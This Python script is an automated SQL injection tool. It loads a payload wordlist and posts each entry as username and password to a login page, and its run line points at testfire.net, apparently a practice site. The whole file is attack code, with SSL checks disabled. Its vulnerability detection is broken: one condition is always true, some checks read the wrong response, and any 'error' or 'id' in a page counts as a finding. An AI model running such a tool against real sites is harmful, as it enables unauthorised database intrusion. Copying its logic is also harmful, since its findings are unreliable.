import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
import socket
import sys
sys.path.append('D:/SQLjj/SQLJ/graphics')
from wordlists import open_file_dialog



####################################33
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
UNIOn_capture = []
########################################






async def word_list_attack(urls,files):
    """UNION SELECT is a technique used in SQL injection attacks to combine the results of two or more SELECT statements into a single result set. """
    """This attack is when we inject some malicious code to the database and extract some code out of it. """
    try:
        global pattern,htmlpattern
        done = False
        # filename = "UnionselectInj.txt"
        # current_directory = os.path.dirname(os.path.abspath(__file__))
        # file_path = os.path.join(current_directory, filename)

        with open(files, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            print(Fore.RED + str(sorted_payload))
            requests.packages.urllib3.disable_warnings()  # Disable SSL warnings
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls } Do you want to send the payload to the website according to the above payload? ")
                
                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"):
                        #############################################################33
                        params = {
                            "username": line,
                            "password": line
                        }
                        ##############################################################################
                        # print(line)
                        ack = requests.post(url=urls, data=params,verify=False)
                        print(f"[{datetime.now()}]","|Current payload: |", line,"|with status code|:",ack.status_code)
                        print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            print(Fore.RED + "|Vulnerability found|:", ack.text)
                            
                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE)
                        if vuln:
                            print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found: |", ack.text," | with the count of: |",len(vuln))
                            await asyncio.sleep(3)
                        
                        if htmlVULN:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"with the count of:",len(htmlVULN))
                            await asyncio.sleep(3)
                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found|:", ack.text,"|with the count of:|",len(htmlVULN))
                            await asyncio.sleep(3)
                        
                        if errword:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"|with the count of:|",len(htmlVULN))
                            await asyncio.sleep(3)
                            
                        
                            
                    if ack.status_code == 302:
                        print(f"[{datetime.now()}]","|[INFO]Could inject the injectable are to the website,keyword:|",params["username"])
                        done = True
                    
                    if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.")
                        
                        
                elif ack.status_code == 200:
                    print(f"[{datetime.now()}]",Fore.RED+"[ERROR]Could connect to the website but did not found any injectable area on the website.")
                        
                else:
                    # continue
                    pass
                        
            else:
                print(f"[{datetime.now()}]","[ERROR]Could not connect to the website.Host seems to be down or not available at the time")
                        
                    
    
    except ConnectionAbortedError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionAbortedError:",e)
        
    except ConnectionError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionError:",e)
        
    except ConnectionRefusedError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionRefusedError",e)
        
    except ConnectionResetError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionResetError:",e)
        
    except KeyboardInterrupt:
        ch = input(f"[{datetime.now()}]",Fore.RED+"[!] Are you sure that you want to exit?")
        if ch == "y":
            raise SystemExit
        print(f"[{datetime.now()}]",Fore.BLACK+"[INFO] User exited the program")
        
    except UnboundLocalError:
        pass
    
    except Exception as e:
        print(f"[{datetime.now()}]",f"Error: {str(e)}")
        
    except MemoryError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR]There is an issue with you RAM:",e)
    
 
        
    finally:
        pass
        # global UNIOn_capture
        # print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
        #                    \n{ack.text}\n     """)
        # UNIOn_capture.append(ack.text)
        
                
# asyncio.run(union_based_SQL_inj("https://redtiger.labs.overthewire.org/level1.php"))
# if __name__ != "main":
#     pass      
asyncio.run(word_list_attack("http://testfire.net/login.jsp",open_file_dialog()))